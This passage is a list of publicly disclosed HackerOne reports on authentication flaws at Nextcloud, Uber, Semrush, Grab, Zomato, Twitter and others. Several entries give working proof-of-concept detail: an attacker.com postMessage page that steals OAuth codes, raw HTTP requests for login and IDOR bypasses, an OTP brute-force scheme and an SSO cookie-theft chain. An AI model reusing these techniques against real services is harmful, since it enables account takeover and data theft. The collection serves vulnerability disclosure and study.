This is also really easy to discover - I stumbled across it when I noticed some requests were randomly being denied as unauthorized. It turns out all of my requests should have been unauthorized!

Recommended Fix
========
Add httpSessionContextIntegrationFilter immediately before x509ProcessingFilter in the acegi-security.xml file, for the /remoting/ and /agent-websocket/ entries.

This fixes it because the httpSessionContextIntegrationFilter clears the thread-local security context after each request, thus fixing the problem.

---

### [bypass of 2FA](https://hackerone.com/reports/248656)

- **Report ID:** `248656`
- **Severity:** High
- **Weakness:** Improper Authentication - Generic
- **Program:** Nextcloud
- **Reporter:** @kaysbugs
- **Bounty:** 750 usd
- **Disclosed:** 2018-07-29T20:38:19.117Z
- **CVE(s):** CVE-2018-3775

**Summary (team):**

Improper protection of the 2FA login made a bypass of the 2FA possible.
The bug required to know user credentials but effectively rendered the 2FA ineffective.

The issue has been fixed by the Nextcloud team and has been validated by the reporter.

---

### [Unauthorized access to jiratest.starbucks.com ](https://hackerone.com/reports/332586)

- **Report ID:** `332586`
- **Severity:** Critical
- **Weakness:** Improper Authentication - Generic
- **Program:** Starbucks
- **Reporter:** @damian89
- **Bounty:** - usd
- **Disclosed:** 2018-05-30T20:29:28.263Z
- **CVE(s):** -

**Summary (team):**

@damian89 found an unsecured JIRA instance containing internal and sensitive information. The finding was supported with detailed reporting and impact information. We immediately blocked remote access to the site and prevented anonymous users from browsing and editing issues. Thank you @damian89 for your great research!

---

### [Improper Authentication in Vimeo's API 'versions' endpoint.](https://hackerone.com/reports/328724)

- **Report ID:** `328724`
- **Severity:** High
- **Weakness:** Improper Authentication - Generic
- **Program:** Vimeo
- **Reporter:** @bugdiscloseguys
- **Bounty:** - usd
- **Disclosed:** 2018-05-15T17:38:50.719Z
- **CVE(s):** -

**Summary (team):**

The `versions` endpoint was exploitable by accounts that were not pro or business.

**Summary (researcher):**

Issue
--
There was an authorization issue in `versions` endpoint, Which on exploiting could allow an attacker to leak private videos of pro/business users due to the fact version is only applicable for pro/business accounts. 

Impact 
--
Making a crafted request will result in VICTIM_VIDEO_VERSION to be MOVED from victim's video to current version of attacker's video. On playing attacker video's victim's video will be played.

---

### [[insideok.ru] Database Dump](https://hackerone.com/reports/197789)

- **Report ID:** `197789`
- **Severity:** High
- **Weakness:** Improper Authentication - Generic
- **Program:** ok.ru
- **Reporter:** @bigbear_
- **Bounty:** - usd
- **Disclosed:** 2018-04-25T17:28:49.355Z
- **CVE(s):** -

**Vulnerability Information:**

http://insideok.ru/db.sql

Внутри - учётки админов на 2016 год.

-- Хост: localhost
-- Время создания: Сен 03 2016 г., 12:00
-- Версия сервера: 5.5.47-cll-lve
-- Версия PHP: 5.4.45


# Структура таблицы `users`

`CREATE TABLE IF NOT EXISTS `users` (
  `id` int(11) unsigned NOT NULL,
  █████
  ███████
  ███████
██████████
███
██████████
███
█████████
███████
████████
█████
█████
) ENGINE=InnoDB AUTO_INCREMENT=60 DEFAULT CHARSET=utf8 AVG_ROW_LENGTH=5461;`


# Дамп данных таблицы users

`INSERT INTO `users` (██████████) VALUES
████
███
████████
███
████
███████
████████
███████
█████
███
███
████████
███████
███████
████████
██████
████████
████
███`

---

### [[oauth token leak] at oauth.semrush.com](https://hackerone.com/reports/314814)

- **Report ID:** `314814`
- **Severity:** High
- **Weakness:** Improper Authentication - Generic
- **Program:** Semrush
- **Reporter:** @nikitastupin
- **Bounty:** - usd
- **Disclosed:** 2018-04-17T11:58:56.526Z
- **CVE(s):** -

**Vulnerability Information:**

Domain, site, application
---
oauth.semrush.com

Steps to reproduce
---
1) Create following html at attacker.com/postmessage.html

```
<script>
  function listener(event) {
    alert(JSON.stringify(event.data));
  }

  var dest = window.open("https://oauth.semrush.com/oauth2/authorize?response_type=code&scope=user.info,projects.info,siteaudit.info&client_id=seoquake&redirect_uri=https%3A%2F%2Foauth.semrush.com%2Foauth2%2Fsuccess&state=636e7bae-22ed-407d-8d62-1d49b49ec962");
  
  window.addEventListener("message", listener);
</script>
```
2) Go to attacker.com/postmessage.html (make sure you are logged in at www.semrush.com)
3) Click "Approve"
4) Go to tab with attacker.com, you will see alert with `code`
5) Make POST request with obtained `code`
```
POST /oauth2/access_token HTTP/1.1
Host: oauth.semrush.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:58.0) Gecko/20100101 Firefox/58.0
Accept: */*
Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-type: application/x-www-form-urlencoded
Content-Length: 205
DNT: 1
Connection: close

client_id=seoquake&client_secret=██████████&grant_type=authorization_code&code=[COPY OBTAINED CODE HERE]&redirect_uri=https%3A%2F%2Foauth.semrush.com%2Foauth2%2Fsuccess
```
6) Receive response with `access token` and `refresh token`
```
HTTP/1.1 200 OK
Server: nginx
Content-Type: application/json
Connection: close
Cache-Control: no-cache
Date: Sat, 10 Feb 2018 19:06:38 GMT
Set-Cookie: session=████; expires=Sat, 10-Feb-2018 21:06:38 GMT; Max-Age=7200; path=/; httponly

{"access_token":"███████","token_type":"Bearer","expires_in":604800,"refresh_token":"kiAMXIrTVjfvD131wraCjTLN4CzS7ABhqUGvweYC"}
```

Actual results
---
`access token` and `refresh token` of victim:
```
{"access_token":"██████████","token_type":"Bearer","expires_in":604800,"refresh_token":"kiAMXIrTVjfvD131wraCjTLN4CzS7ABhqUGvweYC"}
```

PoC, exploit code, screenshots, video, references, additional resources
---
This vulnerability is possible due to lack of `window.opener` origin check at `https://oauth.semrush.com/oauth2/success`:
```
<script>
	if (window.opener && typeof opener.postMessage === 'function') {
		opener.postMessage({ type: 'semrush:oauth:success', url: location.href }, '*');
	}
</script>
```
Meaning any site that opens `https://oauth.semrush.com/oauth2/success` may read `code` in `location.href`.

Attack vector based on fact that user sees SEOquake authorization page F262215 thinking that it's just official application permission request and with high probability clicks "Approve".

Still working at vector without this small user interaction.

## Impact

OAuth tokens leakage. This leads to user sensitive information leakage.
**Note**: it's not necessary to install SEOquake plugin!

P.S.
---
I'm aware of user info leakage, project info leakage and Site Audit info leakage but maybe there is wider scope of possible sensitive info leak.

I've reported vulnerability as soon as possible therefore no time to deeper scope research.

---

### [Urgent : Unauthorised Access to Media content of all Direct messages and protected tweets(Indirect object reference)](https://hackerone.com/reports/99600)

- **Report ID:** `99600`
- **Severity:** High
- **Weakness:** Improper Authentication - Generic
- **Program:** X / xAI
- **Reporter:** @indoappsec
- **Bounty:** - usd
- **Disclosed:** 2018-03-21T23:09:55.963Z
- **CVE(s):** -

**Vulnerability Information:**

Hi Team,

You can tweet from your ad account while creating a campaign.When you add a media content from your computer and upload it there is a Json request which gives you the link of your media(Photos) to preview before Tweeting.This link is Vulnerable to IDOR Attack and it leads to disclose all the media content of twitter.I have checked and verified that it discloses the media content of any user's Direct messages and also protected tweets.

Vulnerable HTTP request : 

GET /media_id_to_cdn_url.json?media_id=[Media_id]&_=1447455982153 HTTP/1.1
Host: ads.twitter.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:37.0) Gecko/20100101 Firefox/37.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Referer: https://ads.twitter.com/accounts/18ce53x5krr/campaigns/5936943/copy?campaign_type=followers&promoted_account=true&source=campaign_dashboard
Cookie: [Cookie_values]
Connection: keep-alive

Here Media_id is vulnerable to IDOR attack and it leads to give you the exact link of the Media content(Photos).

For more Information I am providing Video POC :
Link : https://youtu.be/GMZgEqej61M

This is a critical issue ,Kindly Fix it in priority.

Best Regards !
Vijay Kumar

---

### [Leak ██████████ information in real time through API request](https://hackerone.com/reports/307050)

- **Report ID:** `307050`
- **Severity:** High
- **Weakness:** Improper Authentication - Generic
- **Program:** Grab
- **Reporter:** @severus
- **Bounty:** 3000 usd
- **Disclosed:** 2018-02-03T04:55:47.755Z
- **CVE(s):** -

**Summary (team):**

The researcher identified an endpoint that was publicly accessible and contained minuscule amount of sensitive information with some dummy data. We quickly resolved the issue and rewarded the researcher.

We are thankful to @severus for his continued contribution to our bug bounty program to keep Grab safe.

---

### [Access to GitLab's Slack by abusing issue creation from e-mail](https://hackerone.com/reports/218230)

- **Report ID:** `218230`
- **Severity:** Critical
- **Weakness:** Improper Authentication - Generic
- **Program:** GitLab
- **Reporter:** @intidc
- **Bounty:** - usd
- **Disclosed:** 2017-09-21T05:59:20.034Z
- **CVE(s):** -

**Vulnerability Information:**

Hi there,

I found a way to become a verified GitLab team member on [Slack](http://gitlab.slack.com). 
By doing so, I gained access to dozens of channels possibly containing sensitive information. Note that I deleted my account `intidc_hackerone` immediately afterwards and did not join, read or engage with any of those channels.



#How it works

- The [GitLab Slack login page](https://gitlab.slack.com/) allows anyone with a `@gitlab.com` e-mail address to join the team:

{F172989}

 - GitLab allows new issues to be created when e-mailed to a unique e-mail address containing a secret token at `incoming+{username}/{projectname}+{token}@gitlab.com`

{F172990}

- As you can see, this is a valid **@gitlab.com** e-mail address, so we can use the issues system to sign up for services like Slack, Facebook Workplace, ...

{F172991}

- These e-mail verification e-mails are e-mailed as new issue tickets to my project:

{F172992}

{F172993}

- After clicking the verification link, all you need to do is set-up 2FA and you'll be able to access GitLab's Slack:

{F172987}

*I took a screenshot of some channels as a proof of concept, but did not actually enter them*
 
 
#Suggested fix

I've seen companies taking different approaches to prevent this from happening:

- Only allow employees to join the Slack group by invitation, [like Facebook does](http://facebook.slack.com).
- Enable SSO or other authentication methods, [like PayPal does](https://paypal.slack.com)

These fixes can be carried out quickly but aren't waterproof: an attacker will still be able to gain access to similar services such as Facebook workplace or Yammer if they use similar authentication methods. 

In the longer run, a safer approach would be:

- Requiring users to mail their issue tickets to a gitlab subdomain e-mail, such as `@reply.gitlab.com`


Please let me know if you have any questions,
Best regards,

Inti

**Summary (researcher):**

SEE BLOGPOST: "How I hacked hundreds of companies through their helpdesk" https://medium.com/@intideceukelaire/how-i-hacked-hundreds-of-companies-through-their-helpdesk-b7680ddc2d4c

---

### [Authorization bypass using login by phone option+horizontal escalation possible on Grab Android App](https://hackerone.com/reports/205000)

- **Report ID:** `205000`
- **Severity:** High
- **Weakness:** Improper Authentication - Generic
- **Program:** Grab
- **Reporter:** @sp1d3rs
- **Bounty:** - usd
- **Disclosed:** 2017-09-14T02:54:12.710Z
- **CVE(s):** -

**Vulnerability Information:**

**Description:**
After my previous report about 2FA bypass on the Profile Edit endpoint i was interested to find enpoint, which will allow me horizontal privileges escalation.
So, I found the endpoint using android app `https://p.grabtaxi.com/api/passenger/v2/profiles/activationsms` which allow me to bypass OTP code due to lack of rate limiting.
The root cause of the problem it that facts: resend code endpoint do not have rate limiting (it has only 30 seconds timing for resending possibility). But code activation on the `https://p.grabtaxi.com/api/passenger/v2/profiles/activate` has 3 attempts limit, then it will be expired.
Combined this two facts, i found that it is possible to succeed in the account takeover of any user using only phone number.
Method: we have only 3 code attempts, and we can reset the code every 30 seconds without rate limiting.
**This gave us 6 attempts in the minute, 360 attempts in the hour, and 8640 attempts in 24 hour**. Since codes range has only 9999 values (it is 4-digit), we will likely succeed with the correct code in the 24-72 hours.
Attacker just need to choose some 3 custom OTP codes, for example, 1056, 1057, 1058, and start trying to send them every 30 seconds. If all 3 codes will fail - reset it and try again in next 30 seconds. Sooner or later, Grab Server will throw some of this codes, and this code will be accepted, and we will have access to the victim's account. How it looks in the Web Debugger - you can see on the screenshot attached (`test.png`).
Example report, where used similar method: https://hackerone.com/reports/149598

##Impact

The attacker can bypass OTP verification on Grab android app on any mobile number using "Login with mobile number" option. Attacker can succeed in the account takeover of any user without any privileges, using only phone number and country code.

##Steps To Reproduce:

1. Use my POC tool, attached to the report (written on C#, requires .NET 4.0). Sources included.
2. Enter your test phone number  to the field (it must starts with country code without `+` and be the connected to the Grab account on Android app) - or you can use my test number `███` and press Start.
3. Tool will start sending 3 code attempts `1056, 1057, 1058` and refreshing the code in case of failing every 30 seconds. The process may take many hours, but sooner or later you will receive message with success response and session header. 


##Mitigation/Remediation Steps:
I suggest you implement a rate-limiting on this endpoint `https://p.grabtaxi.com/api/passenger/v2/profiles/activationsms`, for example, blocking code resending for some time after 5 or more resends.

**Summary (researcher):**

###Summary
I found a OTP code bypass on the login endpoint, used by Grab Android App. Since no password was required upon login (only SMS code), it was actually account takeover (still, the victim will be informed that something is wrong  because of few incoming SMSes with codes).
The team was very responsible and fixed the issue fast.
Thanks to the Grab team for the great experience and the bounty! It is a pleasure to work with you!

###Technique
The used method (thanks to the @yaworsk and his #149598 report!) is highly depending on the luck due to low enough chance to guess correct code using only 3 attempts in 30 seconds (and we must consider that the server may not throw the one of the choosen codes for a very long time). So account takeover is not so easy, and requires a lot of time. The side effect of this - it is abusing the SMS sending mechanism (it was fixed too).

###Why it works
1) The code had only 4 digits (with 5-6 digits chance to guess the code dramatically drop). Even with 4 digits tool can work a week without results.
*and*
2) There was no limiting on the code refreshing attempts  (now it is, and also account can be locked).

###Used tools and apps:
1) Nox App Player (android emulator), proxied through web debugging proxy.
2) Tested application - https://play.google.com/store/apps/details?id=com.grabtaxi.passenger (app allows registration from any country)
3) Custom C# tool for SMS code refreshing.

---

### [SAML Authentication Bypass on uchat.uberinternal.com](https://hackerone.com/reports/223014)

- **Report ID:** `223014`
- **Severity:** High
- **Weakness:** Improper Authentication - Generic
- **Program:** Uber
- **Reporter:** @mishre
- **Bounty:** 8500 usd
- **Disclosed:** 2017-09-05T18:05:56.996Z
- **CVE(s):** -

**Summary (team):**

Due to improper SAML verification it was possible to bypass the OneLogin authentication on https://uchat.uberinternal.com and gain unauthorized access to internal chats.

We enjoyed working with @mishre on this report and look forward to receiving more submissions from them in the future!

**Summary (researcher):**

http://blog.mish.re/index.php/2017/09/06/uber-bug-bounty-gaining-access-to-an-internal-chat-system/

---

### [Login to any account with the emailaddress](https://hackerone.com/reports/245408)

- **Report ID:** `245408`
- **Severity:** High
- **Weakness:** Improper Authentication - Generic
- **Program:** Eternal
- **Reporter:** @gerben_javado
- **Bounty:** 1000 usd
- **Disclosed:** 2017-08-17T11:27:59.348Z
- **CVE(s):** -

**Summary (team):**

##Introduction
An attacker just needs to supply an email address to gain a valid access token for the Zomato applications. Thus any account on Zomato can be fully accessed with just the email address.

#Endpoint
`/v2/auth.json`

##Impact
Critical, without any user interaction an attacker can access any account.

**Summary (researcher):**

At some point I started focusing on the mobile app, since in my experience a mobile app has more server-side (read criticial) issues, while a webapplication has more client-side vulnerabilities. After testing the login flow for the three different options: Facebook, Google and password based, I noticed that Google login looked slightly weird in the fact that a lot of data was send besides the Google OAuth token. Thus I started stripping parameters one by one after which I noticed that only the email of a user was required to login. This request would look like:

```http
POST /v2/auth.json?isGoogle=true HTTP/1.1
X-API-Key: 4749b89651969b87a3kfc739o254ada2
Content-Type: application/x-www-form-urlencoded
Content-Length: 21
Host: api.zomato.com
Connection: close

email=email@example.com
```  

Thus I could login as any user on Zomato given I knew their email address.

---

### [Ability to log in as any user without authentication if █████████ is empty](https://hackerone.com/reports/215053)

- **Report ID:** `215053`
- **Severity:** Critical
- **Weakness:** Improper Authentication - Generic
- **Program:** Ubiquiti Inc.
- **Reporter:** @thenickdude
- **Bounty:** - usd
- **Disclosed:** 2017-08-08T18:03:00.970Z
- **CVE(s):** -

**Summary (team):**

Devices that can be monitored by airControl include a ticket based authentication system that allows access to the WebUI using a ticket id. This system had a flaw that allowed unauthenticated access without a valid ticket, given these requirements were met:
1. A device was monitored by airControl.
2. The "Open Web-UI" airControl feature was used on the device since last reboot.
3. Device wasn't rebooted after #2.

The vulnerability was reported on 2017-03-21 and fixed in these versions:
* airOS v8.0.2, v7.2.5, v6.0.2, v5.6.15 (released 2017-03-28)
* airGateway v1.1.9 (released 2017-03-28)
* airFiber v3.7-rc3, v3.4.3, v3.2.3 (released 2017-04-07)

* airControl 2.0.2 and 2.1-beta7 include changes to the "Open Web-UI" function authentication routine that makes all prior device versions invulnerable even after the "Open Web-UI" feature is used.

---

### [Authentication bypass on auth.uber.com via subdomain takeover of saostatic.uber.com](https://hackerone.com/reports/219205)

- **Report ID:** `219205`
- **Severity:** Critical
- **Weakness:** Improper Authentication - Generic
- **Program:** Uber
- **Reporter:** @arneswinnen
- **Bounty:** - usd
- **Disclosed:** 2017-07-13T00:43:06.116Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary
This is not a standard vulnerability, but a chain of two more exotic vulnerabilities leading to a full authentication bypass of your SSO login system at auth.uber.com (via saostatic.uber.com). The root cause of this authentication bypass is two-fold:

1. Subdomain saostatic.uber.com was pointing to Amazon Cloudfront CDN, but the hostname was not registered there anymore. This allowed me to fully takeover this domain. It is now serving content of my own webserver, both over http and https (highly similar to [175070](https://hackerone.com/reports/175070) - however, I must disagree with "there are some mitigating factors (cookie scope) that make this not as bad as it might appear at first blush."). 
2. Your SSO system at auth.uber.com issues session cookies which are temporarily shared between all https://*.uber.com subdomains through its "domain=.uber.com" attribute. Although there were some countermeasures to prevent theft, the current setup still allows leakage of these high-value session cookies to the overtaken subdomain https://saostatic.uber.com in all modern browsers, leading to a full Authentication Bypass (highly similar to [172137](https://hackerone.com/reports/172137)).

## Security Impact
The security impact of the subdomain takeover is that Uber can be impersonated via this webpage. A valid SSL certificate could easily be generated for this domain via Let's Encrypt, which would make it ideal for e.g. phishing attacks. 

The security impact of the SSO system using shared session cookies for https://*.uber.com is, in combination with the subdomain takeover vulnerability, an Authentication Bypass via session hijacking. A victim must be authenticated to auth.uber.com and then visit a webpage under the attacker's control to be exploited successfully - no further interaction is required from the victim, the attack can be performed stealthily without the user noticing or being notified by Uber. The end result is that the attacker can now impersonate the victim on any of the *.uber.com which rely on auth.uber.com for authentication, such as riders.uber.com, partners.uber.com, developer.uber.com, bonjour.uber.com, etc. 

# 1. Subdomain Takeover

The subdomain "saostatic.uber.com" was (and still is) a CNAME pointing to a AWS Cloudfront CDN server (depending on your location, the latter will resolve differently):
```
# nslookup saostatic.uber.com 8.8.8.8
Server:		8.8.8.8
Address:	8.8.8.8#53

Non-authoritative answer:
saostatic.uber.com	canonical name = d3i4yxtzktqr9n.cloudfront.net.
```
However, the hostname "saostatic.uber.com" was not claimed anymore on Cloudfront, resulting in a Cloudfront error page when visiting the subdomain before the takeover:

{F173887}

Subsequently, a new Amazon Cloudfront CDN endpoint was created and linked to an attacker-controlled origin server. For the new Cloudfront CDN endpoint, "saostatic.uber.com" was designated as hostname successfully:

{F173885}

This concluded the subdomain takeover. Visual proof can be found at http://saostatic.uber.com/subdomaintakeoverbyarneswinnen.html (unguessable filename chosen to not negatively affect Uber's reputation during takeover period) :

 {F173884}

#2. Authentication Bypass

In Uber's SSO system, auth.uber.com acts as Identity Provider and issues temporarily shared session cookies for https://*.uber.com to communicate identities to Service Providers (e.g. riders.uber.com, partners.uber.com, etc). Service Providers on their end immediately destroy the incoming temporary shared session cookies in case of erroneous (e.g. issued for other Service Provider) or successful authentication, ensuring the window for theft is small:

 {F202679}

The precious shared session cookie "_csid" can thus only be stolen between step 9 and 10, which is a very short period (automatic browser redirect). Although not impossible to exploit, a more convenient flaw was identified that allows the shared session cookie to remain alive after step 9 in the browser's cookie store in the diagram above. The issue is that, if the victim is already logged in at https://riders.uber.com (situation after last step 12 in diagram) when receiving a request containing a valid newly generated shared session cookie "_csid", it is simply ignored. Hence it stays alive in the browser until its cookie store is cleared. An attacker simply needs to directly issue another login scenario starting from step 3 in the above diagram, and end with an additional hidden request to https://saostatic.uber.com to steal the precious session cookie:

{F202676}

So now an attacker has his/her hands on the victim's "_csid" shared session cookie for https://riders.uber.com, he/she can execute the normal login flow in their own browser and replace the issued "_csid" cookie value in step 9 of the first Uber SSO Login diagram to be logged in as the victim, right? Wrong. There's another countermeasure in place, namely a variant of login cross-site request forgery protection. This is the actual updated Uber SSO Login 2 diagram:

{F202678}

The problem here are the GET param state=CSRFTOKEN and locally scoped state cookie that are added in step 3 by the Service Provider riders.uber.com and verified in step 11. Since we can't steal these values from the victim's browser, but only the "_csid" shared session cookie, this means game over, right?

No! An attacker can obtain a proper CSRFTOKEN value and accompanying state cookie value from https://riders.uber.com by starting a normal login scenario on their end (e.g. in their own browser or via a simple script). He/she can then relay the auth.uber.com URL to the victim's browser to get the "_csid" shared session cookie for these values, and inject these in his/her own browser login scenario again in step 9. In this manner, the victim effectively generates the "_csid" temporary session token for the attacker's login scenario in a separate browser, but this works flawlessly. This still allows exploitation and thus victim impersonation in the following manner (we still assume that the victim is already logged in to auth.uber.com and visits a webpage under control by the attacker, so we basically continue the flow from the above third and last diagram): 

{F202677}

# PoC

In the PoC below, the assumption is made that https://saostatic.uber.com is actually serving a valid certificate in the victim's browser, which currently is not the case (so there is currently no actual exposed risk). I figured you might not appreciate that. 

1. Open the victim's browser & browse to https://riders.uber.com . After being redirected to https://auth.uber.com , login with the victim's credentials so you end up on https://riders.uber.com trips dashboard again.
2. Open a second browser tab in the victim's browser and browse to https://saostatic.uber.com/prepareuberattack.php . Accept any certificate warnings that you may receive here - again, we're only simulating that the domain has a valid SSL certificate. Once the page has finished loading you should see a URL, "Cookie: " string and a "Set-Cookie: " strings underneath each other. This is all info gathered under the hood by the attacker's webserver that is required to login as the victim now.
3. Open the separate attacker's browser and setup an intercepting proxy tool to intercept requests and responses. Browse to the URL displayed on the prepareuberattack.php page output and intercept this request. Now copy the "Cookie: ..." string displayed on prepareuberattack.php and paste it into the request headers. 
4. The response should be a redirect to https://riders.uber.com/trips, indicating successful authentication bypass. Last but not least, copy all the "Set-Cookie: " lines from the prepareuberattack.php page output and paste them in the response before forwarding it to the browser. This ensures that the stolen cookies are properly injected in the attacker's browser. 
5. You are now logged in as the victim in the attacker's browser 

In a real attack scenario, an attacker would stealthily load https://saostatic.uber.com/prepareuberattack.php in the victim's browser, e.g. through an iframe. Likewise, he/she would probably not display the URL and all the cookies on the PHP page, but store this on the server-side, ready to be abused in a stealthy fashion. 

You can see all these PoC steps executed in attachment "8. Authentication Bypass PoC video.mp4", where browser 1 and browser 2 had separate upstream servers and thus even other IP addresses to prove this is a plausible threat. The code of the https://saostatic.uber.com/prepareuberattack.php and https://saostatic.uber.com/uberattack.php pages is also attached ("9. prepareuberattack.php" and "10. uberattack.php"). This was written quick & dirty for PoC purposes - I know the code is pretty hacky.

# Recommendations
1. The recommendation for the subdomain takeover is straightforward: remove the dangling DNS CNAME pointer to Amazon CloudFront and the issue is resolved.
2. The recommendation for the generic Authentication Bypass issue is a bit more problematic. The fact that identities supplied to Service Providers by the Identity Provider are communicated via shared *.uber.com cookies make them susceptible for all vulnerabilities that allows insight in cookies on any *.uber.com subdomain. This includes remote code execution, subdomain takeover,  debug logs, etc and has a very serious impact on Uber's overall security, even when the subdomain is hosted in a completely isolated environment. 
For example, all the mentioned out of scope *.uber.com subdomains in the program's listing (bizblog.uber.com, newsroom.uber.com etc) have the inherent ability to bypass authentication of any Uber user, even though they might be remotely managed by an external party with lower security standards than Uber. Ironically enough, any service that wants to benefit from the current Uber SSO system will have to receive a *.uber.com subdomain, as this is required by design. This in its turn increases the attack surface for abuse of the generic Authentication Bypass. 
On the short term I would recommend fixing the fact that the "_csid" cookie can remain alive in a browser once a user is already logged in (although [Jack Whitton already showed that CSP could be abused to prevent a victim to make the request back to the Service Provider and invalidate the token](https://whitton.io/articles/uber-turning-self-xss-into-good-xss/), so I wouldn't put too much trust in that). On the mid-to-long term I would advise Uber to migrate to a real OAuth SSO system that communicates identity secrets and proofs by other means than shared cookies, e.g. GET parameters (OAuth "code" flow) or window.location.hash values (e.g. OAuth "access tokens" flow). 

Let me know if anything is unclear.

Cheers,

Arne Swinnen
https://www.arneswinnen.net

**Summary (team):**

subdomain takeover of saostatic.uber.com allowed for access to *.uber.com scoped SSO cookies. In response to this report, we immediately fixed the subdomain takeover and then added additional protections (IP restriction) to our *.uber.com SSO cookies to mitigate ATO possibility of subdomain takeover in the future.

We appreciate @arneswinnen's high quality report and the open interaction on the tradeoffs between various SSO schemes -- we look forward to future reports and interactions with him in the future.

**Summary (researcher):**

Technical summary: https://www.arneswinnen.net/2017/06/authentication-bypass-on-ubers-sso-via-subdomain-takeover/

---

### [Default credentials on a DoD website](https://hackerone.com/reports/192074)

- **Report ID:** `192074`
- **Severity:** High
- **Weakness:** Improper Authentication - Generic
- **Program:** U.S. Dept Of Defense
- **Reporter:** @korprit
- **Bounty:** - usd
- **Disclosed:** 2017-07-03T18:04:44.529Z
- **CVE(s):** -

**Summary (team):**

A Department of Defense website was misconfigured in a manner that may have allowed a malicious user to reset, or steal login credentials. @korprit was able to demonstrate this vulnerability by testing the user account application of the website. Thanks @korprit!

---

### [Subdomain Takeover on  http://blog.owox.com/](https://hackerone.com/reports/184884)

- **Report ID:** `184884`
- **Severity:** Critical
- **Weakness:** Improper Authentication - Generic
- **Program:** OWOX, Inc.
- **Reporter:** @yynl
- **Bounty:** - usd
- **Disclosed:** 2017-05-22T09:48:14.841Z
- **CVE(s):** -

**Summary (team):**

Subdomain Takeover via http://blog.owox.com

**Summary (researcher):**

Subdomain Takeover via http://blog.owox.com

---

### [Subdomain Takeover on OWOX.RU](https://hackerone.com/reports/186393)

- **Report ID:** `186393`
- **Severity:** Critical
- **Weakness:** Improper Authentication - Generic
- **Program:** OWOX, Inc.
- **Reporter:** @yynl
- **Bounty:** - usd
- **Disclosed:** 2017-05-22T09:46:29.927Z
- **CVE(s):** -

**Summary (team):**

Subdomain http://www.owox.ru/ was preserved from being taken over by an attacker:
https://kiosk.owox.ru/
https://blog.owox.ru/

---

### [Broken Authentication & Session Management (Login Bypass) at support.owox.com](https://hackerone.com/reports/222082)

- **Report ID:** `222082`
- **Severity:** Critical
- **Weakness:** Improper Authentication - Generic
- **Program:** OWOX, Inc.
- **Reporter:** @koviri_jagdish
- **Bounty:** - usd
- **Disclosed:** 2017-05-22T09:38:48.100Z
- **CVE(s):** -

**Summary (team):**

Hello Team,
While I was testing your Web Application OWOX, I came to know that https://support.owox.com/ is Vulnerable to "Broken Authentication & Session Management Vulnerability" and it is possible to bypass the login very easily.

When the user login with his credentials via gmail account, he allowed to access his account, but he logs out from https://support.owox.com/, the session is not completely expired and it is possible to bypass login by just old request replay or by clicking the signup button, It won't ask for gmail account credentials for logging in after ending previous session.

Here are the steps to reproduce the bug :

Step 1 : Go to https://support.owox.com/hc/ and Sign in with you gmail account
Step 2 : Browser few web pages at https://support.owox.com/hc/
Step 3 : Log out from https://support.owox.com/hc/ (make sure you have logged out from gmail also)
Step 4 : Click on Sign in again, you won't be asked for login with Gmail or something like that.

Successfully Logged In without entering username-password or gmail account.
Please fix this bug and let me know if you need any other information.

Thank You
K. Jagdish

---

### [password reset token leaking allowed for ATO of an Uber account](https://hackerone.com/reports/173551)

- **Report ID:** `173551`
- **Severity:** Critical
- **Weakness:** Improper Authentication - Generic
- **Program:** Uber
- **Reporter:** @procode701
- **Bounty:** - usd
- **Disclosed:** 2017-05-17T16:35:51.363Z
- **CVE(s):** -

**Summary (team):**

With an email address for a valid Uber account, it was possible to take over that account because the reset token was exposed in the response of a password reset HTTP request. This meant an attacker could initiate password reset for an account and immediately receive the reset token for that account.

We consider the security of our user's data top priority, so we were very interested in this report. Furthermore, @procode701 was a pleasure to work with and we look forward to more reports in the future.

---

### [Broken Authentication & Session Management - Failure to Invalidate Session on all other browsers at Password change](https://hackerone.com/reports/226712)

- **Report ID:** `226712`
- **Severity:** Critical
- **Weakness:** Improper Authentication - Generic
- **Program:** Paragon Initiative Enterprises
- **Reporter:** @koviri_jagdish
- **Bounty:** - usd
- **Disclosed:** 2017-05-07T16:44:12.869Z
- **CVE(s):** -

**Vulnerability Information:**

Broken Authentication & Session Management - Failure to Invalidate Session on all other browsers at Password change
==========================================================
Hello Team,
While I was testing your web application "Paragon Initiative Enterprises", I came to know that it is vulnerable to "Broken Authentication and Session Management > Failure to Invalidate Session > On Password Reset" at https://bridge.cspr.ng/my/account .

Description : When a user changes his account password, all the sessions on other devices/browsers should expire.

Cause : Suppose any user (victim) left his account logged in on any computer/browser (victim could use browser at Cyber Cafe or any shared computer). And after a particular he realized that he left his account logged in, and there is a security provided that when a user changes his account password all other sessions should invalidate or expire, which will expire the session from that shared computer.

But in your web application, I didn't found any such security that invalidate the session after password. Here if any user left his account logged in, any attacker can misuse the victim's account and there is no option available to the victim to invalidate the session on that shared computer which could lead to some major problems.


>Steps to reproduce the bug :
>Step 1 : Go to Browser A at (say Mozilla Firefox) and login with your credentials at https://bridge.cspr.ng/ and login with your credentials.

>Step 2 : Similarly, Go to Browser B at (say Google Chrome) and login with your same credentials at https://bridge.cspr.ng/ and login with your credentials.

>Step 3 : Suppose Browser A (Mozilla Firefox) is an shared computer's browser, and you left your account logged in at that computer. Go to Browser B (Google Chrome) and change your account
password at https://bridge.cspr.ng/my/account.

>Step 4 : When you change your account password at Browser B (Google Chrome), the session at Browser A (Mozilla Firefox) should expire and the account should automatically logged out.

>Step 5 : Go to Browser A (Mozilla Firefox), and visit your https://bridge.cspr.ng/ account page and refresh the page.

You will notice that even after changing the account password at Browser B (Google Chrome), the session at Browser A (Mozilla Firefox) didn't expired which can cause major problems.

Please fix the bug and let me know if you need any other information.

Regards
K. Jagdish

---

### [[ipm.informatica.com]- Broken Authentication](https://hackerone.com/reports/201152)

- **Report ID:** `201152`
- **Severity:** High
- **Weakness:** Improper Authentication - Generic
- **Program:** Informatica
- **Reporter:** @adminadminadmin
- **Bounty:** - usd
- **Disclosed:** 2017-04-11T04:53:44.585Z
- **CVE(s):** -

**Summary (team):**

The Researcher was able to visit the internal pages of the application by changing few parameters in the URL. We have identified it as broken authenticated page display.

Due to the EOL of the application, it was decommissioned.

**Summary (researcher):**

i was able to bypass authentication on one of the internal app. for more information please visit hackervis.blogspot.com.

---

